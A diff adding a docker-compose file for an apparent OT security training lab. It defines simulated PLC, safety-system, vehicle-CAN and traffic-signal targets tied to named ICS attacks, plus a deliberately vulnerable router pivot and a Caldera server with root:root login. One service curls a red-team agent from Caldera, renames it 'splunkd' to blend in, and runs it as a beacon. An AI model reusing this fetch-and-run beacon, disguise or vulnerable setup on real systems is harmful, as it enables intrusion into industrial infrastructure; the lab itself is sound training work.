@@ -1,0 +1,267 @@
+# mrhOTshOT - containerized OT target lab ("otlab").
+#
+# Replaces the ESXi VM fleet with one container per PLC/process, each serving its
+# real protocol set via water_tank_server.py --process, on its own container IP.
+# Attacks run either from a container joined to `otlab` (use the `docker` profile:
+# targets resolve by service hostname -> native ports) or from the host (each
+# distinct protocol port is published below).
+#
+#   docker compose -f docker/docker-compose.yml up -d --build     # or: make lab-up
+#   docker compose -f docker/docker-compose.yml down -v           # or: make lab-down
+#
+# Swarm: the deploy: keys make `docker stack deploy -c docker/docker-compose.yml
+# otlab` work too, but single-host Compose is the supported path.
+#
+# ZONES (additive over the flat backbone): `otlab` stays the out-of-band
+# management/DNS backbone that every container keeps an interface on (so console
+# orchestration, Docker DNS, FUXA and Caldera keep working unchanged). On top,
+# three Purdue-style zone subnets model NETWORK_TOPOLOGY.md and give each host a
+# static zone IP:  IT 192.168.0.0/24 | OT 192.168.1.0/24 | Mgmt 192.168.100.0/24.
+# The `router` service is multi-homed across them and NATs IT->OT, so traffic
+# aimed at an OT zone IP (set via config/targets.yaml) traverses it - the real
+# inter-zone chokepoint. Traffic addressed by hostname stays on `otlab`.
+
+x-target: &target
+  build:
+    context: ..
+    dockerfile: docker/Dockerfile
+  image: mrhotshot/target
+  restart: unless-stopped
+  networks: [otlab]
+  deploy:
+    replicas: 1
+    restart_policy: {condition: on-failure}
+
+services:
+  # PLC-1 Water Treatment - IEC-104 :2404
+  plc-water:
+    <<: *target
+    hostname: plc-water
+    command: ["water_tank_server.py", "--process", "water_treatment"]
+    ports: ["2404:2404"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.10}
+
+  # PLC-2 Power Substation - IEC-61850 :8102 + IEC-104 :2404
+  plc-power:
+    <<: *target
+    hostname: plc-power
+    command: ["water_tank_server.py", "--process", "power_substation"]
+    ports: ["8102:8102"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.11}
+
+  # PLC-3 Gas Pipeline - OPC-UA :4840 (+ FINS :9600, MELSEC :5007)
+  plc-gas:
+    <<: *target
+    hostname: plc-gas
+    command: ["water_tank_server.py", "--process", "gas_pipeline"]
+    ports: ["4840:4840", "9600:9600"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.12}
+
+  # PLC-4 Centrifuge - S7comm :102 (+ EtherNet/IP :44818)
+  plc-centrifuge:
+    <<: *target
+    hostname: plc-centrifuge
+    command: ["water_tank_server.py", "--process", "centrifuge"]
+    ports: ["102:102"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.13}
+
+  # PLC-5 Building HVAC - BACnet/IP :47808/udp
+  plc-hvac:
+    <<: *target
+    hostname: plc-hvac
+    command: ["water_tank_server.py", "--process", "building_hvac"]
+    ports: ["47808:47808/udp"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.14}
+
+  # PLC-6 Boiler House - ABB :5020
+  plc-boiler:
+    <<: *target
+    hostname: plc-boiler
+    command: ["water_tank_server.py", "--process", "boiler_house"]
+    ports: ["5020:5020"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.15}
+
+  # PLC-7 Heating District - Modbus TCP :502 (FrostyGoop target, ENCO slave_id 11)
+  plc-heating:
+    <<: *target
+    hostname: plc-heating
+    command: ["water_tank_server.py", "--process", "heating_district"]
+    ports: ["502:502"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.16}
+
+  # PLC-8 Water Utility - DNP3 :20000
+  plc-dnp3:
+    <<: *target
+    hostname: plc-dnp3
+    command: ["water_tank_server.py", "--process", "water_utility_dnp3"]
+    ports: ["20000:20000"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.17}
+
+  # PLC-9 Sensor Network - M-Bus :5000 (Fuxnet target)
+  plc-sensors:
+    <<: *target
+    hostname: plc-sensors
+    command: ["water_tank_server.py", "--process", "sensor_network"]
+    ports: ["5000:5000"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.18}
+
+  # Vehicle CAN bus - CANopen node over a TCP-tunnelled CAN gateway :20001
+  # (automotive CAN-injection target: accelerate/brake + accelerometer).
+  plc-vehicle:
+    <<: *target
+    hostname: plc-vehicle
+    command: ["vehicle_canopen_server.py", "--port", "20001"]
+    ports: ["20001:20001"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.20}
+
+  # Traffic signal controller - NTCIP 1202 over SNMP :161/udp
+  # (transportation target: signal phases, conflicting-green override attack).
+  plc-signals:
+    <<: *target
+    hostname: plc-signals
+    command: ["signal_controller_snmp_server.py", "--port", "161"]
+    ports: ["161:161/udp"]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.21}
+
+  # SIS-1 Safety System - Triconex TriStation UDP :1502 (TRITON target).
+  # Monitors plc-water's IEC-104 channel, trips on overflow.
+  sis:
+    <<: *target
+    hostname: sis
+    command: ["triconex_sis_server.py", "--plc-ip", "plc-water", "--plc-port", "2404", "--sis-port", "1502", "--threshold", "90"]
+    ports: ["1502:1502/udp"]
+    depends_on: [plc-water]
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.19}
+
+  # Edge router - vulnerable Flask web server :8080 (initial-access pivot) AND the
+  # multi-homed L3 router between the IT/OT/Mgmt zones. router_init.sh enables IPv4
+  # forwarding and SNATs IT->OT so attacker traffic aimed at OT zone IPs (192.168.1.x)
+  # traverses this container (the chokepoint), then execs the vulnerable web server.
+  router:
+    <<: *target
+    hostname: router
+    cap_add: [NET_ADMIN]
+    sysctls: ["net.ipv4.ip_forward=1"]
+    entrypoint: ["sh", "/app/router_simulation/router_init.sh"]
+    command: ["router_simulation/vulnerable_router_server.py"]
+    ports: ["8080:8080"]
+    networks:
+      otlab: {}
+      it-net: {ipv4_address: 192.168.0.13}
+      ot-net: {ipv4_address: 192.168.1.4}
+      mgmt-net: {ipv4_address: 192.168.100.2}
+
+  # Operator SCADA (FUXA) - a Level-2 supervisory *monitoring* HMI: the operator's
+  # live screen. This is NOT the "HMI" host the attack narrative pivots through
+  # (that is the Windows box 192.168.1.55, esxi-only, no container). On the otlab
+  # network so it can poll the PLCs by hostname (e.g. Modbus -> plc-heating:502),
+  # and given the documented OT-zone HMI address 192.168.1.55 on ot-net.
+  # Built from Dockerfile.fuxa (adds the modbus-serial driver the stock image omits).
+  # A district-heating view ships in the fuxa_data volume (seeded by
+  # scripts/seed_fuxa_hmi.py); open it at http://localhost:1881.
+  fuxa:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.fuxa
+    image: mrhotshot/fuxa
+    hostname: fuxa
+    restart: unless-stopped
+    networks:
+      otlab: {}
+      ot-net: {ipv4_address: 192.168.1.55}
+    ports: ["1881:1881"]
+    volumes: ["fuxa_data:/usr/src/app/FUXA/server/_appdata"]
+    deploy:
+      replicas: 1
+      restart_policy: {condition: on-failure}
+
+  # MITRE Caldera - adversary-emulation orchestration. On otlab so its OT
+  # abilities can reach the PLCs by hostname. Login root:root; the dashboard
+  # talks to its REST API with the api_key in caldera/local.yml (no second login).
+  # Published on 8889 to avoid the console's 8888.
+  caldera:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.caldera
+    image: mrhotshot/caldera
+    hostname: caldera
+    restart: unless-stopped
+    networks: [otlab]
+    ports: ["8889:8888"]
+    volumes: ["./caldera/local.yml:/usr/src/app/conf/local.yml:ro"]
+    command: ["--log", "INFO"]
+    deploy:
+      replicas: 1
+      restart_policy: {condition: on-failure}
+
+  # Auto-deployed red-team foothold: a sandcat agent on otlab that beacons to
+  # Caldera and runs the OT abilities against the PLCs - so operations have an
+  # agent to run on the moment the lab is up, no manual deploy. Reuses the caldera
+  # image (has curl + a runtime compatible with the modbus_cli payload). It waits
+  # for Caldera to be reachable, downloads the freshly built agent, and runs it.
+  caldera-agent:
+    image: mrhotshot/caldera
+    hostname: caldera-agent
+    restart: unless-stopped
+    depends_on: [caldera]
+    networks: [otlab]
+    entrypoint: ["/bin/sh", "-c"]
+    command:
+      - >
+        cd /tmp;
+        until curl -s -f -X POST -H "file:sandcat.go" -H "platform:linux"
+        http://caldera:8888/file/download -o splunkd && [ -s splunkd ]; do
+        echo "[agent] waiting for caldera..."; sleep 3; done;
+        chmod +x splunkd;
+        exec ./splunkd -server http://caldera:8888 -group red -v
+
+# otlab = flat management/DNS backbone (unchanged). it-net/ot-net/mgmt-net = the
+# Purdue zone subnets; `name:` is set on each so the separate console project can
+# join them external. mgmt-net is internal (no external egress).
+networks:
+  otlab:
+    name: otlab
+    driver: bridge
+  it-net:
+    name: it-net
+    driver: bridge
+    ipam:
+      config: [{subnet: 192.168.0.0/24, gateway: 192.168.0.1}]
+  ot-net:
+    name: ot-net
+    driver: bridge
+    ipam:
+      config: [{subnet: 192.168.1.0/24, gateway: 192.168.1.1}]
+  mgmt-net:
+    name: mgmt-net
+    driver: bridge
+    internal: true
+    ipam:
+      config: [{subnet: 192.168.100.0/24, gateway: 192.168.100.1}]
+
+volumes:
+  fuxa_data: {}
